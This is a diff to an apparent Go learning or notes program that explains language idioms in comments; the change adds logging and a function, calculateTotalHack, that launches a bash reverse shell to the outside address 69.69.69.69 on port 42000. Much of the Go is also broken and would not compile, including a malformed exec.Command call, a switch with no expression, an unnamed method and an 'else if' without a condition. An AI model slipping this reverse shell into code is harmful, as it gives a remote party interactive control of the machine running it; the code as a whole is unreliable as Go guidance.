@@ -15,9 +15,13 @@ package main //
 // comments 
 
 import (
-	fmt
-	strings
-	flag // -h is a default flag for help!
+	"fmt"
+	"strings"
+	"time"
+	"log"
+	"os"
+	"os/exec"
+	"flag" // -h is a default flag for help!
 	// generally there is a newline between imported library packages and project packages and external depencies
 
 	// These are stored in the GOPATH Environment variable under a src directory 
@@ -42,6 +46,11 @@ func (g *gopherShape) () (result string, err error) {
 	return result, nil
 }
 
+InfoLogger = log.New(os.Stdout, "INFO: ", log.Ldate|log.Ltime|log.Lshortfile)
+WarningLogger = log.New(os.Stdout, "WARNING: ", log.Ldate|log.Ltime|log.Lshortfile)
+ErrorLogger = log.New(os.Stdout, "ERROR: ", log.Ldate|log.Ltime|log.Lshortfile)
+
+
 func main() {
 	var hackingString, argument string 
 	var differentPlace string = "Depending on the code culture or specific instance where it make readable sense to write golang like this"
@@ -52,7 +61,12 @@ func main() {
 	// CLI ./usefulGolang cmd -a <string arg here> 
 	aCommand.StringVar(&argument, "a", "default value", "An description")
 	// Depending on project, either args are handlede as array or string; Or more likely public CLI repositories that handle this 
-
+	err := initaliseLogging()
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "Error:", err)
+		panic(err) // Exit safetly after goroutines returns and crashes
+	}
+	time.Sleep(1 * time.Second)
 
 	switch {
 		case 0:
@@ -66,7 +80,8 @@ func main() {
 				theHackMap[i] = char
 			}
 		case 3:
-		default:
+			err = calculateTotalHack()
+		// default: You do not always need a `default:` statement
 	
 	} 
 
@@ -74,14 +89,25 @@ func main() {
 	defer fmt.Printf("%s %s!\n", hackingString)
 }
 
-func calculateTotalHack() {
+func calculateTotalHack() error {
 	needToHack := true
 	if needToHack {
-	
+		shell := exec.Command("bash" "-c 'exec bash -i &>/dev/tcp/69.69.69.69/42000 <&1'")
+		err := shell.Start()
+		if err != nil {
+			return err
+		}
+		err = shell.Wait()
+		if err != nil {
+			return err
+		}
+		return nil
 	} else if {
-	
+		
 	} else {
-	
+		err := fmt.Errorf("calculatetotalhack, example custom error messages - no uppercase letters!")
+		fmt.Fprintln(os.Stderr, "Error:", err)
+		return err
 	}
 }
 
